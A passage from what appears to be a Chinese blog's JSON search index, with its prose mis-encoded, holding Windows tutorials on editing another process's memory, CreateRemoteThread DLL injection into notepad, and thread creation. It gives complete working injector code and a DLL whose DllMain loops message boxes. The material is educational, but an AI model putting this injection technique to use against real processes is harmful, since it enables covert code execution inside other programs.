ä¸€ã€‚ 123456789101112#include &lt;stdio.h&gt;#include &lt;synchapi.h&gt;#include &lt;processthreadsapi.h&gt;int i;int main() { printf(&quot;My Process ID: %d\\n&quot;, GetCurrentProcessId()); while(1) { printf(&quot;%d. &quot;, i++); Sleep(100); }} ç¼–å†™ä¿®æ”¹å™¨ä»£ç ä¿®æ”¹å™¨ä¼šå…ˆæ ¹æ®ç›®æ ‡è¿›ç¨‹çš„ProcessIdè·å–å¥æŸ„ï¼Œç„¶åå†è°ƒç”¨ReadProcessMemoryå’ŒWriteProcessMemoryè¯»å†™ç›®æ ‡è¿›ç¨‹çš„å…¨å±€å˜é‡iï¼Œå½“iå¤§äº20æ—¶æ¸…é›¶ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;memoryapi.h&gt;#include &lt;errhandlingapi.h&gt;int main(int argc, char **argv) { if(argc &lt; 2) { printf(&quot;Usage: modifier [pid]\\n&quot;); return -1; } //OpenProcessè·å¾—ç›®æ ‡è¿›ç¨‹çš„å¥æŸ„ int targetPid = atoi(argv[1]); HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetPid); if(NULL == hTarget) { printf(&quot;Open Process Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } //è¯»å†™ç›®æ ‡è¿›ç¨‹å…¨å±€å˜é‡iï¼Œåœ°å€ä¸º0x407970 int targetI; BOOL result; while(1) { result = ReadProcessMemory(hTarget, (void *)0x407970, &amp;targetI, sizeof(int), NULL); if(!result) { printf(&quot;Read Process Memory Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } else if(targetI &gt; 20) { targetI = 0; result = WriteProcessMemory(hTarget, (void *)0x407970, &amp;targetI, sizeof(int), NULL); if(!result) { printf(&quot;Write Process Memory Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } } Sleep(600); } return 0;} è¿è¡Œç»“æœé¦–å…ˆè¿è¡Œç›®æ ‡ç¨‹åºprogramï¼Œå¾—åˆ°å…¶è¿›ç¨‹æ ‡è¯†ç¬¦ä¸º4372ï¼Œç„¶åå†è¿è¡Œä¿®æ”¹å™¨ç¨‹åºå¹¶ä¼ å…¥å‚æ•°4372ï¼Œå³modifier 4372ï¼Œä¸€æ®µæ—¶é—´åç»ˆæ­¢ä¿®æ”¹å™¨ã€‚æœ€ç»ˆï¼Œprogramçš„æ‰“å°ç»“æœå¦‚ä¸‹ï¼š 12345678910&gt; programMy Process ID: 43720. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 55. 56. 57. å…¨å±€å˜é‡iä¸€å¼€å§‹ä¼šä¸æ–­è‡ªå¢ï¼Œå½“ä¿®æ”¹å™¨å¼€å§‹è¿è¡Œåï¼Œiçš„å€¼ä¾¿è¢«æ¸…é›¶ï¼Œç„¶åå½“içš„å€¼è¶…è¿‡20åä¹Ÿä¼šè¢«æ¸…é›¶ã€‚ä¿®æ”¹å™¨åœæ­¢è¿è¡Œåï¼Œiçš„å€¼åˆä¼šä¸æ–­è‡ªå¢è€Œä¸ä¼šè¢«æ¸…é›¶ã€‚","link":"/2021/01/19/windows-modify-process-memory/"},{"title":"ä½¿ç”¨CreateRemoteThreadå‘ç›®æ ‡è¿›ç¨‹æ³¨å…¥DLL","text":"åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­æåˆ°ï¼Œå¦‚æœè¦ä½¿ç”¨CreateRemoteThreadåœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼š åœ¨æ­£å¸¸ä½¿ç”¨æ—¶ï¼Œè¿œç¨‹çº¿ç¨‹çš„ä»£ç æ˜¯åœ¨ç›®æ ‡è¿›ç¨‹ä¸­æœ¬æ¥å°±æœ‰çš„ã€‚ æ˜¯å¦æœ‰ä¸€ç§æ‰‹æ®µï¼Œä½¿å¾—åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºçš„è¿œç¨‹çº¿ç¨‹ï¼Œæ‰§è¡Œä»»æ„è‡ªå·±æƒ³è¦æ‰§è¡Œçš„ä»£ç å‘¢ï¼Ÿä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡DLLæ³¨å…¥æ¥å®ç°ã€‚ å‡å¦‚å½“å‰ç”¨æˆ·æ­£åœ¨è¿è¡Œä¸€ä¸ªè®°äº‹æœ¬notepadè¿›ç¨‹ï¼Œé‚£ä¹ˆï¼Œå…¶ä»–è¿›ç¨‹å°±å¯ä»¥é€šè¿‡CreateRemoteThreadåœ¨notepadè¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ã€‚ä¸è¿‡é€šå¸¸æƒ…å†µä¸‹ï¼Œçº¿ç¨‹ä¸­æ‰§è¡Œçš„ä»£ç æ˜¯notepadè¿›ç¨‹ä¸­æœ¬æ¥å°±æœ‰çš„ã€‚ç°åœ¨æƒ³è®©notepadè¿›ç¨‹æ‰§è¡Œä¸‹è¿°ä»£ç ï¼š 1234char str[100];sprintf(str, &quot;pid: %d&quot;, GetCurrentProcessId());while(1) MessageBoxA(NULL, str, &quot;DLL Inject&quot;, MB_ICONSTOP | MB_OK); notepadæœ¬èº«ä¸å¯èƒ½æœ‰è¿™ç§æ— é™å¼¹çª—çš„ä»£ç ï¼Œæ‰€ä»¥æ²¡æ³•ç›´æ¥é€šè¿‡CreateRemoteThreadåˆ›å»ºçº¿ç¨‹æ‰§è¡Œå®ƒä»¬ã€‚é€šè¿‡DLLæ³¨å…¥çš„æ–¹å¼ï¼Œå¯ä»¥è®©notepadè¿›ç¨‹æœ€ç»ˆèƒ½æ‰§è¡Œä¸Šé¢è¿™ä¸ªæ— é™å¼¹çª—çš„ä»£ç ã€‚ ç¼–å†™å…·æœ‰DllMainçš„DLLåŠ¨æ€é“¾æ¥åº“dllæ–‡ä»¶ä¸­ï¼Œé€šå¸¸åŒ…å«ä¸€äº›å…¶ä»–ä»£ç å¯èƒ½ä¼šä½¿ç”¨åˆ°çš„å‡½æ•°å’Œæ•°æ®ã€‚å…¶ä»–ç¨‹åºå¯ä»¥é€šè¿‡LoadLibraryAå‡½æ•°åŠ è½½dllæ–‡ä»¶ï¼Œç„¶åå°±èƒ½ä½¿ç”¨dllä¸­çš„å‡½æ•°äº†ã€‚ ä¸€äº›dllä¸­ä¼šæœ‰ä¸€ä¸ªDllMainå‡½æ•°ï¼Œå®ƒè¢«ç§°ä¸ºdllçš„å…¥å£ç‚¹ã€‚å½“dllè¢«è£…è½½æ—¶ï¼ŒDllMainä¸­çš„ä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚Microsoftçš„æ–‡æ¡£ï¼šDllMain entry point å½“è‡ªå·±ç¼–å†™dllçš„ä»£ç æ—¶ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰DllMainå‡½æ•°çš„å†…å®¹ã€‚æ¯”å¦‚ï¼Œå°†DllMainå‡½æ•°çš„å†…å®¹å†™æˆæ— é™å¼¹çª—çš„ä»£ç ï¼š 1234567891011#include &lt;windef.h&gt;#include &lt;winuser.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;BOOL WINAPI DllMain() { char str[100]; sprintf(str, &quot;pid: %d&quot;, GetCurrentProcessId()); while(1) MessageBoxA(NULL, str, &quot;DLL Inject&quot;, MB_ICONSTOP | MB_OK);} å°†ä¸Šè¿°ä»£ç ä¿å­˜åœ¨æ–‡ä»¶0.cä¸­ã€‚æ¥ä¸‹æ¥ï¼Œå°†å…¶ç¼–è¯‘æˆ0.dllã€‚æˆ‘ä½¿ç”¨çš„mingw-gccå°†å…¶ç¼–è¯‘æˆdllçš„å‘½ä»¤ä¸ºï¼š 12gcc -c 0.c -o 0.ogcc -shared 0.o -o 0.dll å¯ä»¥å†™ä¸ªä»£ç æµ‹è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹åŠ è½½è¿™ä¸ªdllæ–‡ä»¶æ˜¯å¦ä¼šæ‰§è¡ŒDllMainå‡½æ•°ä¸­çš„è¯­å¥ï¼š 123456#include &lt;libloaderapi.h&gt;int main() { HMODULE h0 = LoadLibraryA(&quot;0.dll&quot;); return 0;} ç¼–è¯‘è¿è¡Œï¼Œç¨‹åºç«‹åˆ»å¼¹çª—ï¼Œè¯´æ˜åŠ è½½dllæ–‡ä»¶çš„è¡Œä¸ºç¡®å®æ˜¯å¯ä»¥å¯¼è‡´DllMainå‡½æ•°è¢«æ‰§è¡Œçš„ã€‚ ç¼–å†™ç¨‹åºå®ç°DLLæ³¨å…¥ç°åœ¨ï¼Œå·²ç»æœ‰äº†ä¸€ä¸ª0.dllæ–‡ä»¶ã€‚å½“ç¨‹åºå°è¯•åŠ è½½è¿™ä¸ªdllæ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡ŒDllMainå‡½æ•°ä¸­çš„å†…å®¹ï¼Œå‘ç”Ÿæ— é™å¼¹çª—ã€‚äºæ˜¯ï¼Œç°åœ¨çš„ç›®æ ‡å°±å˜æˆäº†ï¼Œè®©ç›®æ ‡è¿›ç¨‹notepadåŠ è½½è¿™ä¸ª0.dllæ–‡ä»¶ã€‚ å°†å­—ç¬¦ä¸²&quot;D:\\0.dll&quot;ä¼ å…¥notepadå†…å­˜ç©ºé—´ä¸­ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œä½¿ç”¨ç»å¯¹è·¯å¾„åŠ è½½dllæ–‡ä»¶ã€‚æ‰€ä»¥ï¼Œå…ˆæŠŠ0.dllå¤åˆ¶åˆ°Dç›˜æ ¹ç›®å½•ä¸‹ï¼Œè¿™æ ·ä¸€æ¥å®ƒçš„ç»å¯¹è·¯å¾„å°±å˜æˆäº†&quot;D:\\0.dll&quot;ã€‚ å­—ç¬¦ä¸²&quot;D:\\0.dll&quot;æ˜¯LoadLibraryAå‡½æ•°çš„å‚æ•°ï¼Œè¦æƒ³åŠæ³•è®©è¿™ä¸ªå­—ç¬¦ä¸²å‡ºç°åœ¨notepadçš„å†…å­˜ç©ºé—´å½“ä¸­ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤è¾¾æˆè¿™ä¸€ç‚¹ï¼š ä½¿ç”¨OpenProcessè·å¾—ç›®æ ‡è¿›ç¨‹notepadçš„å¥æŸ„ ä½¿ç”¨VirtualAllocExåœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·ä¸€å—å†…å­˜ï¼Œå¹¶å¾—åˆ°è¿™å—å†…å­˜çš„èµ·å§‹åœ°å€ ä½¿ç”¨WriteProcessMemoryå°†å­—ç¬¦ä¸²&quot;D:\\0.dll&quot;å†™å…¥è¿™å—å†…å­˜å½“ä¸­ 12345678910111213141516171819//è·å–ç›®æ ‡è¿›ç¨‹å¥æŸ„int pid = atoi(argv[1]);HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);if(NULL == hProcess) { printf(&quot;OpenProcess Error: %d\\n&quot;, GetLastError()); return -1;}//åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·ä¸€å—å†…å­˜ç©ºé—´ï¼Œå†™å…¥å­—ç¬¦ä¸²&quot;D:\\0.dll&quot;void *dllNamePtr = VirtualAllocEx(hProcess, NULL, 10, MEM_COMMIT, PAGE_READWRITE);if(NULL == dllNamePtr) { printf(&quot;VirtualAllocEx Error: %d\\n&quot;, GetLastError()); return -1;}BOOL result = WriteProcessMemory(hProcess, dllNamePtr, &quot;D:\\\\0.dll&quot;, 9, NULL);if(!result) { printf(&quot;WriteProcessMemory Error: %d\\n&quot;, GetLastError()); return -1;}printf(&quot;\\&quot;D:\\\\0.dll\\&quot; String Address: 0x%p\\n&quot;, dllNamePtr); æŸæ¬¡æ‰§è¡Œè¿™æ®µä»£ç ï¼Œç”³è¯·åˆ°çš„å†…å­˜åœ°å€ä¸º0x000001CE24A90000ï¼Œä½¿ç”¨x64dbgæŸ¥çœ‹notepadä¸­çš„è¿™å—å†…å­˜ï¼š è¯´æ˜æˆåŠŸå†™å…¥äº†å­—ç¬¦ä¸²&quot;D:\\0.dll&quot;ã€‚ è·å–LoadLibraryAçš„å†…å­˜åœ°å€é¦–å…ˆï¼Œé€šè¿‡GetModuleHandleAè·å–kernel32.dllæ¨¡å—çš„å¥æŸ„ï¼Œç„¶åå†ä½¿ç”¨GetProcAddressè·å–LoadLibraryAçš„åœ°å€ï¼š 123//æ‰¾åˆ°LoadLibraryAçš„åœ°å€void *funcAddr = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);printf(&quot;LoadLibraryA Address: 0x%p\\n&quot;, funcAddr); æœ‰äººå¯èƒ½ä¼šæ‹…å¿ƒï¼Œé€šè¿‡ä¸Šè¿°æ–¹æ³•ï¼Œæ‰¾åˆ°çš„æ˜¯è‡ªèº«è¿›ç¨‹ä¸­LoadLibraryAçš„å†…å­˜åœ°å€ï¼Œå¹¶ä¸æ˜¯ç›®æ ‡è¿›ç¨‹notepadä¸­LoadLibraryAçš„åœ°å€ã€‚ä¸è¿‡é€šå¸¸æƒ…å†µä¸‹ï¼ŒLoadLibraryAåœ¨ä¸åŒè¿›ç¨‹ä¸­çš„åœ°å€æ˜¯ç›¸åŒçš„ã€‚Dll injection - Wikipediaä¸­æåˆ°ï¼š kernel32.dll is mapped to the same address in almost all processes. Therefore LoadLibrary (which is a function of kernel32.dll) is mapped to the same address as well. æ‰€ä»¥ï¼Œè¿™ç§æ–¹æ³•å¾—åˆ°çš„LoadLibraryAçš„åœ°å€å¯ä»¥è®¤ä¸ºå°±æ˜¯ç›®æ ‡è¿›ç¨‹notepadä¸­LoadLibraryAçš„åœ°å€ã€‚æ¯”å¦‚åœ¨æŸæ¬¡æ‰§è¡Œä¸Šé¢çš„ä»£ç ï¼Œå¾—åˆ°çš„LoadLibraryAçš„åœ°å€ä¸º0x00007FFFC185EBB0ï¼Œx64dbgæ‰¾åˆ°è¿›ç¨‹notepadåœ¨è¿™é‡Œçš„è¯­å¥ï¼š è¯´æ˜è¿™ä¸ªåœ°æ–¹ç¡®å®å°±æ˜¯LoadLibraryAçš„å…¥å£ç‚¹ã€‚ åˆ›å»ºè¿œç¨‹çº¿ç¨‹è°ƒç”¨LoadLibraryA(&quot;D:\\0.dll&quot;)CreateRemoteThreadä¸­ï¼Œçº¿ç¨‹å‡½æ•°åªå…è®¸æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè€ŒLoadLibraryAæ°å¥½å°±æ˜¯åªéœ€è¦ä¸€ä¸ªå‚æ•°ã€‚è€Œä¸”ï¼Œç»è¿‡ä¹‹å‰çš„æ“ä½œï¼Œå·²ç»çŸ¥é“äº†åœ¨notepadè¿›ç¨‹ä¸­LoadLibraryAçš„åœ°å€ï¼Œä»¥åŠå­—ç¬¦ä¸²&quot;D:\\0.dll&quot;çš„åœ°å€ï¼Œäºæ˜¯å°±å¯ä»¥é€šè¿‡CreateRemoteThreadåˆ›å»ºçº¿ç¨‹è°ƒç”¨LoadLibraryAäº†ã€‚ 1234567891011//åˆ›å»ºè¿œç¨‹çº¿ç¨‹è°ƒç”¨LoadLibraryA(&quot;D:\\0.dll&quot;)ï¼ŒåŠ è½½0.dllHANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, funcAddr, dllNamePtr, 0, NULL);WaitForSingleObject(hThread, INFINITE);DWORD exitCode;GetExitCodeThread(hThread, &amp;exitCode); //è·å–LoadLibraryAçš„è¿”å›å€¼if(!exitCode) { printf(&quot;LoadLibraryA Failed!\\n&quot;); return -1;}printf(&quot;Inject Complete.\\n&quot;);return 0; ä¸€æ—¦notepadåŠ è½½0.dllï¼Œå°±ä¼šæ‰§è¡Œå…¶ä¸­çš„DllMainå‡½æ•°ï¼Œè€ŒDllMainçš„å†…å®¹åˆæ˜¯æ— é™å¼¹çª—ç¨‹åºã€‚è¿™æ ·ä¸€æ¥ï¼Œnotepadå°±ä¼šå¼€å§‹æ— é™å¼¹çª—äº†ã€‚ å®Œæ•´ä»£ç åŠè¿è¡Œç»“æœ12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv) { if(argc &lt; 2) { printf(&quot;Usage: injectdll [pid]\\n&quot;); return -1; } //è·å–ç›®æ ‡è¿›ç¨‹å¥æŸ„ int pid = atoi(argv[1]); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if(NULL == hProcess) { printf(&quot;OpenProcess Error: %d\\n&quot;, GetLastError()); return -1; } //åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·ä¸€å—å†…å­˜ç©ºé—´ï¼Œå†™å…¥å­—ç¬¦ä¸²&quot;D:\\0.dll&quot; void *dllNamePtr = VirtualAllocEx(hProcess, NULL, 10, MEM_COMMIT, PAGE_READWRITE); if(NULL == dllNamePtr) { printf(&quot;VirtualAllocEx Error: %d\\n&quot;, GetLastError()); return -1; } BOOL result = WriteProcessMemory(hProcess, dllNamePtr, &quot;D:\\\\0.dll&quot;, 9, NULL); if(!result) { printf(&quot;WriteProcessMemory Error: %d\\n&quot;, GetLastError()); return -1; } printf(&quot;\\&quot;D:\\\\0.dll\\&quot; String Address: 0x%p\\n&quot;, dllNamePtr); //æ‰¾åˆ°LoadLibraryAçš„åœ°å€ void *funcAddr = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); printf(&quot;LoadLibraryA Address: 0x%p\\n&quot;, funcAddr); //åˆ›å»ºè¿œç¨‹çº¿ç¨‹è°ƒç”¨LoadLibraryA(&quot;D:\\0.dll&quot;)ï¼ŒåŠ è½½0.dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, funcAddr, dllNamePtr, 0, NULL); WaitForSingleObject(hThread, INFINITE); DWORD exitCode; GetExitCodeThread(hThread, &amp;exitCode); //è·å–LoadLibraryAçš„è¿”å›å€¼ if(!exitCode) { printf(&quot;LoadLibraryA Failed!\\n&quot;); return -1; } printf(&quot;Inject Complete.\\n&quot;); return 0;} é¦–å…ˆï¼Œæ‰“å¼€è®°äº‹æœ¬ï¼Œç„¶ååœ¨ä»»åŠ¡ç®¡ç†å™¨çš„â€œè¯¦ç»†ä¿¡æ¯â€è¿™ä¸€æ æ‰¾åˆ°notepad.exeçš„pidï¼Œæ¯”å¦‚pidä¸º5908ã€‚ å‡è®¾ä¸Šè¿°ä»£ç è¢«ç¼–è¯‘æˆäº†injectdll.exeï¼Œæ¥ä¸‹æ¥ï¼Œæ‰§è¡Œinjectdll 5908ï¼Œä¾¿èƒ½çœ‹åˆ°è®°äº‹æœ¬çš„å¼¹çª—äº†ï¼š","link":"/2021/01/22/windows-remotethread-dllinject/"},{"title":"åœ¨Windowsä¸­åˆ›å»ºçº¿ç¨‹å’Œè¿œç¨‹çº¿ç¨‹","text":"æœ¬æ–‡è®°å½•äº†å¦‚ä½•ä½¿ç”¨CreateThreadå’ŒCreateRemoteThreadåˆ›å»ºçº¿ç¨‹å’Œè¿œç¨‹çº¿ç¨‹ã€‚ åˆ›å»ºçº¿ç¨‹CreateThreadå‡½æ•°åœ¨Windowsä¸­åˆ›å»ºçº¿ç¨‹å¯ä»¥ä½¿ç”¨CreateThreadå‡½æ•°ï¼Œå…¶åŸå‹ä¸ºï¼š 12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); æœ€é‡è¦çš„ä¸¤ä¸ªå‚æ•°ä¸ºlpStartAddresså’ŒlpParameterï¼Œåˆ†åˆ«è¡¨ç¤ºçº¿ç¨‹çš„èµ·å§‹åœ°å€å’Œçº¿ç¨‹å‡½æ•°çš„å‚æ•°ã€‚åœ¨Cè¯­è¨€ä¸­ï¼Œå¯ä»¥ç”¨å‡½æ•°åè¡¨ç¤ºå‡½æ•°çš„èµ·å§‹åœ°å€ã€‚å¦‚æœçº¿ç¨‹åˆ›å»ºæˆåŠŸï¼Œåˆ™ä¼šè¿”å›æ–°çº¿ç¨‹çš„å¥æŸ„ã€‚ å‚æ•°çš„è¯¦ç»†è§£é‡Šå¯ä»¥å‚è€ƒMicrosoftçš„æ–‡æ¡£ï¼š CreateThread function (processthreadsapi.h) ä¸‹é¢ç¼–å†™ä¸€ä¸ªç®€å•ç¤ºä¾‹æ¥è¯´æ˜CreateThreadå‡½æ•°çš„ç”¨æ³•ã€‚ çº¿ç¨‹å‡½æ•°çš„ç¼–å†™ç”±äºçº¿ç¨‹å¯ä»¥å…±äº«è¿›ç¨‹çš„å…¨å±€å˜é‡ï¼Œå› æ­¤å¯ä»¥ç¼–å†™çº¿ç¨‹å¯¹å…¨å±€å˜é‡è¿›è¡Œè¯»å†™æ“ä½œã€‚ é¦–å…ˆè®¾ç½®ä¸€ä¸ªå…¨å±€å˜é‡iï¼š 1int i; ç„¶åç¼–å†™ä¸¤ä¸ªçº¿ç¨‹å‡½æ•°ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°ä¼šè®©iä¸æ–­åŠ ä¸Šä¸€ä¸ªæ•°ï¼Œå†…å®¹ä¸ºï¼š 1234567891011121314151617/* thread_func1 * ä¼ å…¥å‚æ•°ï¼š * param[0]: å¾ªç¯æ¬¡æ•° * param[1]: è‡ªå¢æ•° * åŠŸèƒ½ï¼š * æ¯æ¬¡å¾ªç¯è®©å…¨å±€å˜é‡iåŠ ä¸Šparam[1] * å¾ªç¯param[0]æ¬¡ */void thread_func1(int *param) { printf(&quot;Thread 1 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { i += param[1]; printf(&quot;%d. &quot;, i); Sleep(100); } printf(&quot;\\nThread 1 End\\n&quot;);} ç¬¬äºŒä¸ªå‡½æ•°ä¼šæ£€æŸ¥iæ˜¯å¦å¤§äºæŸä¸ªå€¼ï¼Œå¦‚æœæ˜¯åˆ™ä¼šå°†iæ¸…é›¶ï¼š 12345678910111213141516171819/* thread_func2 * ä¼ å…¥å‚æ•°ï¼š * param[0]: å¾ªç¯æ¬¡æ•° * param[1]: ä¸Šé™ * åŠŸèƒ½ï¼š * æ¯æ¬¡å¾ªç¯æ£€æŸ¥å…¨å±€å˜é‡iæ˜¯å¦å¤§äºparam[1] * å¦‚æœå¤§äºparam[1]åˆ™å°†iæ¸…é›¶ * å¾ªç¯param[0]æ¬¡ */void thread_func2(int *param) { printf(&quot;\\nThread 2 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { if(i &gt; param[1]) { i = 0; } Sleep(100); } printf(&quot;\\nThread 2 End\\n&quot;);} CreateThreadä¸­å‡½æ•°çš„å‚æ•°åªå…è®¸ä¼ å…¥ä¸€ä¸ªï¼Œæ‰€ä»¥å¦‚æœéœ€è¦ä¼ å…¥å¤šä¸ªå‚æ•°ï¼Œå¯ä»¥é€šè¿‡ä¼ å…¥æ•°ç»„æ¥å®ç°ã€‚ mainå‡½æ•°çš„ç¼–å†™æ¥ä¸‹æ¥ç¼–å†™mainå‡½æ•°ã€‚ é¦–å…ˆè¦å‡†å¤‡ä¸¤ä¸ªå‡½æ•°å‚æ•°çš„æ•°ç»„ï¼š 12int func1_param[2] = {70, 3};int func2_param[2] = {30, 20}; ç¬¬ä¸€ä¸ªå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°ä¸º70å’Œ3ï¼Œè¯´æ˜è¦å¾ªç¯70æ¬¡ï¼Œæ¯æ¬¡å¾ªç¯iè¦åŠ ä¸Š3ï¼›ç¬¬äºŒä¸ªå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°ä¸º30å’Œ20ï¼Œè¯´æ˜è¦å¾ªç¯30æ¬¡ï¼Œå¦‚æœiå¤§äº20åˆ™å°†iæ¸…é›¶ã€‚ ç„¶åè°ƒç”¨CreateThreadå…ˆååˆ›å»ºä¸¤ä¸ªçº¿ç¨‹ï¼š 123456789101112131415161718192021222324HANDLE threadHandles[2];//åˆ›å»ºç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰§è¡Œthread_func1threadHandles[0] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func1, //lpStartAddress func1_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadIdif(NULL == threadHandles[0]) { //æ£€æŸ¥çº¿ç¨‹æ˜¯å¦åˆ›å»ºæˆåŠŸ printf(&quot;Create Thread 1 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1;}//2ç§’ååˆ›å»ºç¬¬äºŒä¸ªçº¿ç¨‹ï¼Œæ‰§è¡Œthread_func2Sleep(2000);threadHandles[1] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func2, //lpStartAddress func2_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadIdif(NULL == threadHandles[1]) { //æ£€æŸ¥çº¿ç¨‹æ˜¯å¦åˆ›å»ºæˆåŠŸ printf(&quot;Create Thread 2 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1;} å¦‚æœè¦ç­‰å¾…ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶ç»“æŸåå†ç»§ç»­æ¥ä¸‹æ¥çš„æ“ä½œï¼Œåˆ™å¯ä»¥ä½¿ç”¨WaitForMultipleObjectsï¼š 1WaitForMultipleObjects(2, threadHandles, TRUE, 100000); æœ€åå…³é—­å¥æŸ„ï¼š 123CloseHandle(threadHandles[0]);CloseHandle(threadHandles[1]);return 0; å®Œæ•´ä»£ç åŠè¿è¡Œç»“æœ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;stdio.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;handleapi.h&gt;int i;/* thread_func1 * ä¼ å…¥å‚æ•°ï¼š * param[0]: å¾ªç¯æ¬¡æ•° * param[1]: è‡ªå¢æ•° * åŠŸèƒ½ï¼š * æ¯æ¬¡å¾ªç¯è®©å…¨å±€å˜é‡iåŠ ä¸Šparam[1] * å¾ªç¯param[0]æ¬¡ */void thread_func1(int *param) { printf(&quot;Thread 1 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { i += param[1]; printf(&quot;%d. &quot;, i); Sleep(100); } printf(&quot;\\nThread 1 End\\n&quot;);}/* thread_func2 * ä¼ å…¥å‚æ•°ï¼š * param[0]: å¾ªç¯æ¬¡æ•° * param[1]: ä¸Šé™ * åŠŸèƒ½ï¼š * æ¯æ¬¡å¾ªç¯æ£€æŸ¥å…¨å±€å˜é‡iæ˜¯å¦å¤§äºparam[1] * å¦‚æœå¤§äºparam[1]åˆ™å°†iæ¸…é›¶ * å¾ªç¯param[0]æ¬¡ */void thread_func2(int *param) { printf(&quot;\\nThread 2 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { if(i &gt; param[1]) { i = 0; } Sleep(100); } printf(&quot;\\nThread 2 End\\n&quot;);}int main() { int func1_param[2] = {70, 3}; int func2_param[2] = {30, 20}; HANDLE threadHandles[2]; //åˆ›å»ºç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰§è¡Œthread_func1 threadHandles[0] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func1, //lpStartAddress func1_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadId if(NULL == threadHandles[0]) { //æ£€æŸ¥çº¿ç¨‹æ˜¯å¦åˆ›å»ºæˆåŠŸ printf(&quot;Create Thread 1 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } //2ç§’ååˆ›å»ºç¬¬äºŒä¸ªçº¿ç¨‹ï¼Œæ‰§è¡Œthread_func2 Sleep(2000); threadHandles[1] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func2, //lpStartAddress func2_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadId if(NULL == threadHandles[1]) { //æ£€æŸ¥çº¿ç¨‹æ˜¯å¦åˆ›å»ºæˆåŠŸ printf(&quot;Create Thread 2 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } WaitForMultipleObjects(2, threadHandles, TRUE, 100000); CloseHandle(threadHandles[0]); CloseHandle(threadHandles[1]); return 0;} 12345678&gt; threadtestThread 1 Start3. 6. 9. 12. 15. 18. 21. 24. 27. 30. 33. 36. 39. 42. 45. 48. 51. 54. 57.Thread 2 Start3. 6. 9. 12. 15. 18. 21. 3. 6. 9. 